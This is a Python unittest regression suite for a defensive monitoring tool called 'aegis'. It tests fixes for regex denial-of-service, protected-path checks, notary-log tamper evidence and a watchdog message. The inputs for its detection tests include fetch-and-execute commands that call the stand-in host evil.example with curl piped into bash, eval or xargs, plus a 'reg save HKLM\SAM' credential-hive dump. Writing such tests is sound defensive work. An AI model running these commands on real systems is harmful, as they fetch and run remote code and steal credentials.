#!/usr/bin/env python3
"""Regression suite for the 2026 SENTINEL siege findings — one class per fix.

Each test would FAIL against the pre-fix code and passes after it. Stdlib
`unittest` only (matching the tool's own trust model), fully sandboxed: any test
that touches durable state redirects the relevant aegis globals into a per-test
tmp dir, so this never reads or writes real ~/.aegis state and never fires a
notification.

Findings pinned here:
  1. ReDoS in _hostile_content / _FETCH_RE / _HOSTILE_ARGV_RES (self-DoS).
  2. _is_protected_path let destructive verbs reach /etc, /var/db, /Library/*.
  3. `notary verify` returned a false clean on same-uid shadow-anchor / tail
     truncation.
  4. fileless-fetch-exec HIGH was evadable via $(...) command substitution and
     `| xargs sh`.
  5. `watchdog` printed "OK — last heartbeat 0 min ago" when there was no beat.
"""
import hashlib
import hmac
import io
import json
import os
import contextlib
import shutil
import sys
import tempfile
import time
import unittest

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
import aegis  # noqa: E402


# --------------------------------------------------------------------------- #
# Finding 1 — ReDoS: the hostile-content/argv scanners must scale ~linearly on
# attacker-controlled text, not cubically/quadratically.
# --------------------------------------------------------------------------- #
class TestReDoSBounded(unittest.TestCase):
    # A budget generous enough to never flake on a busy CI box, yet far below the
    # pre-fix cost (the cubic python-oneliner regex hit ~14s at 10k chars; here we
    # feed 60k, which pre-fix would run for many minutes).
    BUDGET_S = 3.0

    def _under_budget(self, fn, *a):
        t0 = time.time()
        fn(*a)
        dt = time.time() - t0
        self.assertLess(dt, self.BUDGET_S,
                        "%s took %.2fs (>%.1fs budget) — ReDoS not bounded"
                        % (getattr(fn, "__name__", fn), dt, self.BUDGET_S))

    def test_hostile_content_double_run_regex_is_bounded(self):
        # 'python -c ' repeated satisfies the inner literals but never the final
        # `import os`, forcing both interior runs to re-partition (was O(n^3)).
        self._under_budget(aegis._hostile_content, "python -c " * 6000)

    def test_hostile_content_single_run_regex_is_bounded(self):
        # 'curl ' repeated with no URL: each anchor scanned to EOF (was O(n^2)).
        self._under_budget(aegis._hostile_content, "curl " * 20000)

    def test_reg_save_double_run_regex_is_bounded(self):
        self._under_budget(aegis._hostile_content, "reg save " * 6000)

    def test_fetch_prefilter_regex_is_bounded(self):
        # _FETCH_RE runs in the check_behavior pre-filter on full argv.
        self._under_budget(lambda s: aegis._FETCH_RE.search(s), "curl " * 20000)

    def test_hostile_argv_triple_run_regex_is_bounded(self):
        # curl-exfil-post had THREE interior runs; feed the argv scorer directly.
        self._under_budget(aegis._argv_signals, "curl -F " * 8000)

    def test_detection_is_preserved_after_bounding(self):
        # The bounds must not lose real detections (idioms are local, so a normal
        # command still matches within the cap).
        self.assertIn("python-oneliner",
                      aegis._hostile_content("python3 -c 'import os; os.system(1)'"))
        self.assertIn("network-fetch",
                      aegis._hostile_content("curl -fsSL https://evil.example/x"))
        self.assertIn("sam-hive-dump",
                      aegis._hostile_content(r"reg save HKLM\SAM out.hiv"))


# --------------------------------------------------------------------------- #
# Finding 4 — fileless-fetch-exec must fire on the pipe-free evasions, without
# false-positiving on benign value-capture / non-fetch xargs.
# --------------------------------------------------------------------------- #
class TestFilelessEvasions(unittest.TestCase):
    def _top(self, argv):
        sigs = aegis._argv_signals(argv)
        return max((aegis.SEV_ORDER[s] for _, s in sigs), default=-1)

    def _is_high(self, argv):
        return self._top(argv) >= aegis.SEV_ORDER["HIGH"]

    def test_command_substitution_exec_is_high(self):
        self.assertTrue(self._is_high('bash -c "$(curl -fsSL http://evil.example/x)"'))
        self.assertTrue(self._is_high('eval "$(curl -fsSL http://evil.example/x)"'))

    def test_xargs_shell_exec_is_high(self):
        self.assertTrue(
            self._is_high('curl -fsSL http://evil.example/x | xargs -0 bash -c'))

    def test_pipe_baseline_still_high(self):
        self.assertTrue(self._is_high('curl -fsSL http://evil.example/x | bash'))

    def test_benign_value_capture_is_not_high(self):
        # $(curl …) ASSIGNED to a var is captured, not executed — must stay < HIGH.
        self.assertFalse(self._is_high('VERSION=$(curl -s http://internal/version)'))

    def test_benign_xargs_without_fetch_is_not_high(self):
        self.assertFalse(self._is_high('find . -name "*.sh" | xargs sh -c "echo {}"'))


# --------------------------------------------------------------------------- #
# Finding 2 — the protected-path guard must refuse OS-integrity trees while
# still allowing temp / app / user-file quarantine.
# --------------------------------------------------------------------------- #
@unittest.skipIf(aegis.IS_WIN, "POSIX realpath/symlink semantics")
class TestProtectedPathTrees(unittest.TestCase):
    def test_os_integrity_trees_are_refused(self):
        for p in ("/etc", "/etc/hosts", "/etc/sudoers", "/etc/passwd",
                  "/var/db", "/private/var/db", "/private/var/db/dslocal",
                  "/Library/LaunchDaemons", "/Library/LaunchAgents/x.plist"):
            self.assertTrue(aegis._is_protected_path(p),
                            "%s must be refused (protected system tree)" % p)

    def test_sip_and_home_still_protected(self):
        for p in ("/System/Library/LaunchDaemons", "/usr/bin/ssh", "/Users",
                  aegis.HOME):
            self.assertTrue(aegis._is_protected_path(p), p)

    def test_temp_and_app_and_user_files_stay_quarantinable(self):
        allow = ["/tmp/evil", os.path.realpath(tempfile.gettempdir()) + "/evil",
                 "/opt/x/mal", "/usr/local/bin/mal",
                 os.path.join(aegis.HOME, "Downloads", "evil.dmg"),
                 os.path.join(aegis.HOME, ".ssh", "id_ed25519")]
        if aegis.IS_MAC:
            allow.append("/Applications/Evil.app")
        for p in allow:
            self.assertFalse(aegis._is_protected_path(p),
                             "%s must remain quarantinable" % p)


# --------------------------------------------------------------------------- #
# Finding 3 — notary verify must flag same-uid shadow anchors and tail
# truncation, without false-positiving on a post-rotation seq reset.
# --------------------------------------------------------------------------- #
class TestNotaryTamperEvidence(unittest.TestCase):
    def setUp(self):
        self.d = tempfile.mkdtemp(prefix="aegis_notary_reg_")
        self._save = {k: getattr(aegis, k) for k in
                      ("STATE_DIR", "NOTARY_FILE", "HMAC_KEY_FILE", "BASELINE",
                       "ensure_state", "_notary_emit_anchor", "_notary_read_anchors")}
        aegis.STATE_DIR = self.d
        aegis.NOTARY_FILE = os.path.join(self.d, "notary.jsonl")
        aegis.HMAC_KEY_FILE = os.path.join(self.d, "hmac.key")
        aegis.BASELINE = os.path.join(self.d, "baseline.json")
        with open(aegis.BASELINE, "w") as f:
            f.write('{"persistence": {}}')
        aegis.ensure_state = lambda: os.makedirs(self.d, exist_ok=True)
        aegis._notary_emit_anchor = lambda seq, head: "stubbed"

    def tearDown(self):
        for k, v in self._save.items():
            setattr(aegis, k, v)
        shutil.rmtree(self.d, ignore_errors=True)

    def _append(self, n):
        open(aegis.NOTARY_FILE, "w").close()
        for _ in range(n):
            aegis.notary_append()
        return [json.loads(l)
                for l in open(aegis.NOTARY_FILE).read().splitlines()]

    def _pin_anchors(self, value):
        aegis._notary_read_anchors = lambda hours=24: value

    def test_clean_chain_has_no_problems(self):
        chain = self._append(2)
        self._pin_anchors(({l["seq"]: l["head"] for l in chain}, set()))
        problems, _, status = aegis._notary_verify()
        self.assertEqual([], problems)
        self.assertTrue(status.startswith("ok:"))

    def test_shadow_anchor_conflict_is_flagged(self):
        # Attacker rewrites link 2 self-consistently (has hmac.key), then appends a
        # shadow anchor for seq 2. The genuine anchor still exists -> conflict.
        chain = self._append(2)
        key = open(aegis.HMAC_KEY_FILE, "rb").read()
        lines = open(aegis.NOTARY_FILE).read().splitlines()
        rec = json.loads(lines[1])
        rec["state"] = hashlib.sha256(b"attacker").hexdigest()
        rec["head"] = hashlib.sha256(
            ("%s|%s" % (rec["prev"], rec["state"])).encode()).hexdigest()
        rec["mac"] = hmac.new(
            key, ("%d|%s|%s" % (rec["seq"], rec["prev"], rec["state"])).encode(),
            hashlib.sha256).hexdigest()
        lines[1] = json.dumps(rec, sort_keys=True)
        with open(aegis.NOTARY_FILE, "w") as f:
            f.write("\n".join(lines) + "\n")
        anchors = {1: json.loads(lines[0])["head"], 2: rec["head"]}
        self._pin_anchors((anchors, {2}))          # two anchors seen for seq 2
        problems, _, _ = aegis._notary_verify()
        self.assertTrue(any("shadow anchor" in p for p in problems), problems)

    def test_tail_truncation_is_flagged(self):
        chain = self._append(3)
        allanch = {l["seq"]: l["head"] for l in chain}
        lines = open(aegis.NOTARY_FILE).read().splitlines()
        with open(aegis.NOTARY_FILE, "w") as f:
            f.write(lines[0] + "\n" + lines[1] + "\n")   # drop seq 3
        self._pin_anchors((allanch, set()))
        problems, _, _ = aegis._notary_verify()
        self.assertTrue(any("truncated to drop recent history" in p
                            for p in problems), problems)

    def test_post_rotation_seq_reset_is_not_flagged(self):
        # A 10MB rotation resets the local chain to seq=1; the OS log's in-window
        # anchors still carry far-higher pre-rotation seqs. Must NOT read as tamper.
        chain = self._append(1)
        old_tail = {41899: "a" * 64, 41900: "b" * 64}   # pre-rotation, non-contiguous
        self._pin_anchors(({**old_tail, 1: chain[0]["head"]}, set()))
        problems, _, _ = aegis._notary_verify()
        self.assertEqual(
            [], [p for p in problems if "truncated" in p or "shadow" in p],
            problems)

    def test_bare_dict_stub_is_tolerated(self):
        # Back-compat: a caller/stub returning a plain {seq: head} dict (not the
        # (anchors, conflicts) tuple) must still verify.
        chain = self._append(1)
        self._pin_anchors({1: chain[0]["head"]})
        problems, _, status = aegis._notary_verify()
        self.assertEqual([], problems)
        self.assertTrue(status.startswith("ok:"))


# --------------------------------------------------------------------------- #
# Finding 5 — watchdog must not fabricate "last heartbeat 0 min ago" when there
# is no beat and nothing armed.
# --------------------------------------------------------------------------- #
class TestWatchdogNoBeatMessage(unittest.TestCase):
    def setUp(self):
        self.d = tempfile.mkdtemp(prefix="aegis_wd_reg_")
        self._save = {k: getattr(aegis, k) for k in
                      ("BASELINE", "SELF_PLIST", "SELFSTATE", "WATCHDOG_ALERT",
                       "ensure_state", "read_heartbeat", "notify")}
        missing = os.path.join(self.d, "nope")
        aegis.BASELINE = missing
        aegis.SELF_PLIST = missing
        aegis.SELFSTATE = missing
        aegis.WATCHDOG_ALERT = os.path.join(self.d, "alert")
        aegis.ensure_state = lambda: None
        aegis.read_heartbeat = lambda: {}        # no beat on record
        aegis.notify = lambda *a, **k: None

    def tearDown(self):
        for k, v in self._save.items():
            setattr(aegis, k, v)
        shutil.rmtree(self.d, ignore_errors=True)

    def test_no_beat_not_armed_reports_honestly(self):
        buf = io.StringIO()
        with contextlib.redirect_stdout(buf):
            rc = aegis.cmd_watchdog()
        out = buf.getvalue()
        self.assertEqual(0, rc)
        self.assertNotIn("last heartbeat 0 min ago", out,
                         "watchdog fabricated a healthy beat where none exists")
        self.assertIn("no monitor is armed", out)


if __name__ == "__main__":
    unittest.main()
